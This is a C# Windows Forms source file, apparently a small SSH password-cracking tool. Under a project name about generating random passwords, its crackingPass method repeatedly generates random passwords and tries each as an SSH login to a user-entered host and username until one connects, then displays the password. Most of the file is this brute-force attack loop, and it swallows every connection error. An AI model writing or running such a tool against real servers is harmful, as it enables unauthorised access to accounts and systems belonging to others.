using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Renci.SshNet;
using System.Threading;
namespace GeneratingRandomPasswords
{
    public partial class Form1 : Form
    {
        public Thread threadLoop;
        
        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;


        }

        public void crackingPass()
        {
            string passwordX;
            passwordX = GeneratePassword(lowCharCheckBox.Checked, upCharCheckBox.Checked, NumericCheckBox.Checked, SpecialCharCheckBox.Checked, SpaceCheckBox.Checked, int.Parse(passLengthTextBox.Text));

            



            var client = new SshClient(addressTextBox.Text, userTextBox.Text, passwordX);


            while (!client.IsConnected)
            {
                passwordX = GeneratePassword(lowCharCheckBox.Checked, upCharCheckBox.Checked, NumericCheckBox.Checked, SpecialCharCheckBox.Checked, SpaceCheckBox.Checked, int.Parse(passLengthTextBox.Text));
                
                client = new SshClient(addressTextBox.Text, userTextBox.Text, passwordX);

                try
                {
                    client.Connect();
                }
                catch(Exception e)
                {
                    
                }
                richTextBox1.Text = passwordX ;
                if (client.IsConnected)
                {
                    richTextBox1.Text = "Password is :" + passwordX;
                    break;
                }

            }
        }

        private void button1_Click(object sender, EventArgs e)
        {




            threadLoop = new Thread(new ThreadStart(crackingPass));


            threadLoop.Start();

            
















        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }



        public static string GeneratePassword(bool includeLowercase, bool includeUppercase, bool includeNumeric, bool includeSpecial, bool includeSpaces, int lengthOfPassword)
        {
            
            const string LOWERCASE_CHARACTERS = "abcdefghijklmnopqrstuvwxyz";
            const string UPPERCASE_CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string NUMERIC_CHARACTERS = "0123456789";
            const string SPECIAL_CHARACTERS = @"!#$%&*@\";
            const string SPACE_CHARACTER = " ";
            const int PASSWORD_LENGTH_MIN = 8;
            const int PASSWORD_LENGTH_MAX = 128;



            string characterSet = "";

            if (includeLowercase)
            {
                characterSet += LOWERCASE_CHARACTERS;
            }

            if (includeUppercase)
            {
                characterSet += UPPERCASE_CHARACTERS;
            }

            if (includeNumeric)
            {
                characterSet += NUMERIC_CHARACTERS;
            }

            if (includeSpecial)
            {
                characterSet += SPECIAL_CHARACTERS;
            }

            if (includeSpaces)
            {
                characterSet += SPACE_CHARACTER;
            }


            char[] password = new char[lengthOfPassword];
            int characterSetLength = characterSet.Length;

            System.Random random = new System.Random();
            for (int characterPosition = 0; characterPosition < lengthOfPassword; characterPosition++)
            {
                password[characterPosition] = characterSet[random.Next(characterSetLength - 1)];
            }

           

            return string.Join(null, password);
        }

        private void stopBtn_Click(object sender, EventArgs e)
        {
            threadLoop.Abort();
        }
    }
}
